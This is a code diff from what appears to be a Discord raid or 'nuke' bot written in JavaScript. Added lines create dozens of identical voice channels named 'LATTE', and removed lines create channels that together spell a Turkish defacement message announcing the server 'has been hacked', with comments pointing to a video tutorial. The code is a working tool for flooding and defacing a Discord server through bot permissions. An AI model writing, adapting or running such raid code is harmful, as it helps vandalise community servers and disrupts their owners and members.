+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+    await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+      await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", { 
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+          await msg.guild
+    .createChannel("LATTE", {
+      type: "voice"
+    })
+    .then(chan => {
+      chan.setUserLimit("1");
+    });
+
     
-            await msg.guild
-      .createChannel("BU SUNUCU", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKLENMİŞTİR", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("KOLAYDINIZ xD", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-        await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HÜKÜMDARLIĞIMIZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-        await msg.guild
-      .createChannel("SONSUZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("AFFETMEYİZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("YENİLMEYİZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("KÜLLERİMİZDEN", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("DOĞACAĞIZ", { ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-                await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    
-            await msg.guild
-      .createChannel("BU SUNUCU", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKLENMİŞTİR", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("KOLAYDINIZ xD", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-        await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HÜKÜMDARLIĞIMIZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-        await msg.guild
-      .createChannel("SONSUZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("AFFETMEYİZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("YENİLMEYİZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("KÜLLERİMİZDEN", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("DOĞACAĞIZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-                await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");  //www.youtube.com/ENESACARYT TARAFINDAN YAPILMISTIR
-      });
-    
-            await msg.guild
-      .createChannel("BU SUNUCU", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKLENMİŞTİR", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("KOLAYDINIZ xD", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-        await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HÜKÜMDARLIĞIMIZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-        await msg.guild
-      .createChannel("SONSUZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("AFFETMEYİZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("YENİLMEYİZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("KÜLLERİMİZDEN", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("DOĞACAĞIZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-                await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    
-            await msg.guild
-      .createChannel("BU SUNUCU", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKLENMİŞTİR", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("KOLAYDINIZ xD", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-        await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HÜKÜMDARLIĞIMIZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-        await msg.guild
-      .createChannel("SONSUZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("AFFETMEYİZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("YENİLMEYİZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("KÜLLERİMİZDEN", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("DOĞACAĞIZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-                await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    
-            await msg.guild
-      .createChannel("BU SUNUCU", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKLENMİŞTİR", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("KOLAYDINIZ xD", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
-      });
-        await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HÜKÜMDARLIĞIMIZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-        await msg.guild
-      .createChannel("SONSUZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("AFFETMEYİZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("YENİLMEYİZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("KÜLLERİMİZDEN", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("DOĞACAĞIZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-                await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    
-            await msg.guild
-      .createChannel("BU SUNUCU", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKLENMİŞTİR", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("KOLAYDINIZ xD", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-        await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HÜKÜMDARLIĞIMIZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-        await msg.guild
-      .createChannel("SONSUZ", {  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("AFFETMEYİZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("YENİLMEYİZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("KÜLLERİMİZDEN", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("DOĞACAĞIZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-                await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    
-            await msg.guild
-      .createChannel("BU SUNUCU", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKLENMİŞTİR", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("KOLAYDINIZ xD", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-        await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HÜKÜMDARLIĞIMIZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-        await msg.guild
-      .createChannel("SONSUZ", {
-        type: "voice"
-      })   ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("AFFETMEYİZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("YENİLMEYİZ", {  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("KÜLLERİMİZDEN", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("DOĞACAĞIZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-                await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    
-            await msg.guild
-      .createChannel("BU SUNUCU", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKLENMİŞTİR", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("KOLAYDINIZ xD", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-        await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HÜKÜMDARLIĞIMIZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-        await msg.guild
-      .createChannel("SONSUZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("AFFETMEYİZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("YENİLMEYİZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("KÜLLERİMİZDEN", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("DOĞACAĞIZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-                await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    
-            await msg.guild
-      .createChannel("BU SUNUCU", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKLENMİŞTİR", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("KOLAYDINIZ xD", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-        await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HÜKÜMDARLIĞIMIZ", {
-        type: "voice"
-      })   ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-        await msg.guild
-      .createChannel("SONSUZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("AFFETMEYİZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("YENİLMEYİZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("KÜLLERİMİZDEN", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("DOĞACAĞIZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-                await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    
-            await msg.guild
-      .createChannel("BU SUNUCU", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKLENMİŞTİR", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
-      .createChannel("KOLAYDINIZ xD", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-        await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HÜKÜMDARLIĞIMIZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-        await msg.guild
-      .createChannel("SONSUZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("AFFETMEYİZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("YENİLMEYİZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("KÜLLERİMİZDEN", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("DOĞACAĞIZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-                await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    
-            await msg.guild
-      .createChannel("BU SUNUCU", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKLENMİŞTİR", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("KOLAYDINIZ xD", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-        await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HÜKÜMDARLIĞIMIZ", {
-        type: "voice"     ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
